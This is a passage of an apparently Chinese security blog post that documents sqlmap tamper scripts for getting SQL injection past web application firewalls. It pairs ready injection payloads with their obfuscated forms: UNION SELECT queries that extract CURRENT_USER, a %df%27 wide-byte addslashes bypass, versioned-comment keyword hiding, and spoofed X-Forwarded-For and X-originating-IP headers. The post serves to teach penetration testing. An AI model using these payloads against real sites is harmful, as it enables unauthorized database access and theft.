+<p>1 or 1=1    <strong>to</strong>    1 %7c%7c 1=1</p>
+<p>ALL</p>
+<h4 id="unionalltounion-py："><a href="#unionalltounion-py：" class="headerlink" title="unionalltounion.py："></a>unionalltounion.py：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return payload.replace(&quot;UNION ALL SELECT&quot;, &quot;UNION SELECT&quot;) if payload else payload</span><br></pre></td></tr></table></figure>
+<p>用union select替换union all select</p>
+<p>union all select 1,2–+    <strong>to</strong>    union select 1,2–+</p>
+<p>ALL</p>
+<h4 id="unmagicquotes-py："><a href="#unmagicquotes-py：" class="headerlink" title="unmagicquotes.py："></a>unmagicquotes.py：</h4><p>用宽字符绕过 GPC addslashes</p>
+<p>1‘ and 1=1    <strong>to</strong>    1%df%27 and 1=1–</p>
+<p>ALL</p>
+<h4 id="uppercase-py："><a href="#uppercase-py：" class="headerlink" title="uppercase.py："></a>uppercase.py：</h4><p>将payload大写</p>
+<p>union select    <strong>to</strong>    UNION SELECT</p>
+<p>ALL</p>
+<h4 id="varnish-py："><a href="#varnish-py：" class="headerlink" title="varnish.py："></a>varnish.py：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)</span><br><span class="line">headers[&quot;X-originating-IP&quot;] = &quot;127.0.0.1&quot;</span><br><span class="line">return payload</span><br></pre></td></tr></table></figure>
+<p>添加一个HTTP头“X-originating-IP”来绕过WAF</p>
+<p>还可以自定义：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)</span><br><span class="line">&gt;&gt; X-remote-IP: TARGET_PROXY_IP (184.189.250.X)</span><br><span class="line">&gt;&gt; X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)</span><br><span class="line">&gt;&gt; x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)</span><br><span class="line">&gt;&gt; X-remote-IP: * or %00 or %0A</span><br></pre></td></tr></table></figure>
+<p>ALL</p>
+<h4 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h4><p>对不是函数的关键字进行注释</p>
+<p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#    </p>
+<p><strong>to</strong>    </p>
+<p>1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</p>
+<p>MySQL</p>
+<h4 id="versionedmorekeywords-py："><a href="#versionedmorekeywords-py：" class="headerlink" title="versionedmorekeywords.py："></a>versionedmorekeywords.py：</h4><p>注释每个关键字</p>
+<p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</p>
+<p><strong>to</strong></p>
+<p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS</em>//<em>!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#</p>
+<p>MySQL &gt;= 5.1.13</p>
+<h4 id="xforwardedfor-py："><a href="#xforwardedfor-py：" class="headerlink" title="xforwardedfor.py："></a>xforwardedfor.py：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)</span><br><span class="line">headers[&quot;X-Forwarded-For&quot;] = randomIP()</span><br><span class="line">return payload</span><br></pre></td></tr></table></figure>
+<p>添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</p>
+<p>ALL</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">----------------------这是我的底线-----------------------</div>
+    
+</div>
+
+      </div>
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/工具/" rel="tag"><i class="fa fa-tag"></i> 工具</a>
+          
+            <a href="/tags/Owasp-top-10/" rel="tag"><i class="fa fa-tag"></i> Owasp top 10</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/10/14/HackingLab-SQL注入关WP/" rel="next" title="HackingLab_SQL注入关WP">
+                <i class="fa fa-chevron-left"></i> HackingLab_SQL注入关WP
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/10/28/Bugku_WP/" rel="prev" title="BugKu部分WP">
+                BugKu部分WP <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">spira1</p>
+              <p class="site-description motion-element" itemprop="description">路还很长，我的目标是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">76</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:eagerseven@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#用法："><span class="nav-number">1.</span> <span class="nav-text">用法：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#apostrophemask-py"><span class="nav-number">2.</span> <span class="nav-text">apostrophemask.py:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#apostrophenullencode-py"><span class="nav-number">3.</span> <span class="nav-text">apostrophenullencode.py:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#appendnullbyte-py"><span class="nav-number">4.</span> <span class="nav-text">appendnullbyte.py:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base64encode-py"><span class="nav-number">5.</span> <span class="nav-text">base64encode.py:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#between-py"><span class="nav-number">6.</span> <span class="nav-text">between.py:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bluecoat-py"><span class="nav-number">7.</span> <span class="nav-text">bluecoat.py:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#chardoubleencode-py"><span class="nav-number">8.</span> <span class="nav-text">chardoubleencode.py:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#charencode-py"><span class="nav-number">9.</span> <span class="nav-text">charencode.py:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#charunicodeencode-py："><span class="nav-number">10.</span> <span class="nav-text">charunicodeencode.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#commalesslimit-py："><span class="nav-number">11.</span> <span class="nav-text">commalesslimit.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#commalessmid-py："><span class="nav-number">12.</span> <span class="nav-text">commalessmid.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#commentbeforeparentheses-py："><span class="nav-number">13.</span> <span class="nav-text">commentbeforeparentheses.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#concat2concatws-py："><span class="nav-number">14.</span> <span class="nav-text">concat2concatws.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#equaltolike-py："><span class="nav-number">15.</span> <span class="nav-text">equaltolike.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#escapequotes-py："><span class="nav-number">16.</span> <span class="nav-text">escapequotes.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#greatest-py："><span class="nav-number">17.</span> <span class="nav-text">greatest.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#halfversionedmorekeywords-py："><span class="nav-number">18.</span> <span class="nav-text">halfversionedmorekeywords.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#htmlencode-py："><span class="nav-number">19.</span> <span class="nav-text">htmlencode.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ifnull2ifisnull-py："><span class="nav-number">20.</span> <span class="nav-text">ifnull2ifisnull.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#informationschemacomment-py："><span class="nav-number">21.</span> <span class="nav-text">informationschemacomment.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lowercase-py："><span class="nav-number">22.</span> <span class="nav-text">lowercase.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#modsecurityversioned-py："><span class="nav-number">23.</span> <span class="nav-text">modsecurityversioned.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#modsecurityzeroversioned-py："><span class="nav-number">24.</span> <span class="nav-text">modsecurityzeroversioned.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nonrecursivereplacement-py："><span class="nav-number">25.</span> <span class="nav-text">nonrecursivereplacement.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#overlongutf8-py："><span class="nav-number">26.</span> <span class="nav-text">overlongutf8.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#percentage-py："><span class="nav-number">27.</span> <span class="nav-text">percentage.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#plus2concat-py："><span class="nav-number">28.</span> <span class="nav-text">plus2concat.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#plus2fnconcat-py："><span class="nav-number">29.</span> <span class="nav-text">plus2fnconcat.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#randomcase-py："><span class="nav-number">30.</span> <span class="nav-text">randomcase.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#randomcomments-py："><span class="nav-number">31.</span> <span class="nav-text">randomcomments.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#securesphere-py："><span class="nav-number">32.</span> <span class="nav-text">securesphere.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sp-password-py："><span class="nav-number">33.</span> <span class="nav-text">sp_password.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2comment-py："><span class="nav-number">34.</span> <span class="nav-text">space2comment.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2dash-py："><span class="nav-number">35.</span> <span class="nav-text">space2dash.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2hash-py："><span class="nav-number">36.</span> <span class="nav-text">space2hash.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2morecomment-py："><span class="nav-number">37.</span> <span class="nav-text">space2morecomment.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2morehash-py："><span class="nav-number">38.</span> <span class="nav-text">space2morehash.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2mssqlblank-py："><span class="nav-number">39.</span> <span class="nav-text">space2mssqlblank.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2mssqlhash-py："><span class="nav-number">40.</span> <span class="nav-text">space2mssqlhash.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2mysqlblank-py："><span class="nav-number">41.</span> <span class="nav-text">space2mysqlblank.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2mysqldash-py："><span class="nav-number">42.</span> <span class="nav-text">space2mysqldash.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2plus-py："><span class="nav-number">43.</span> <span class="nav-text">space2plus.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2randomblank-py："><span class="nav-number">44.</span> <span class="nav-text">space2randomblank.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#symboliclogical-py："><span class="nav-number">45.</span> <span class="nav-text">symboliclogical.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unionalltounion-py："><span class="nav-number">46.</span> <span class="nav-text">unionalltounion.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unmagicquotes-py："><span class="nav-number">47.</span> <span class="nav-text">unmagicquotes.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#uppercase-py："><span class="nav-number">48.</span> <span class="nav-text">uppercase.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#varnish-py："><span class="nav-number">49.</span> <span class="nav-text">varnish.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#versionedkeywords-py"><span class="nav-number">50.</span> <span class="nav-text">versionedkeywords.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#versionedmorekeywords-py："><span class="nav-number">51.</span> <span class="nav-text">versionedmorekeywords.py：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xforwardedfor-py："><span class="nav-number">52.</span> <span class="nav-text">xforwardedfor.py：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">spira1</span>
+
+  
+</div>
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+-->
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
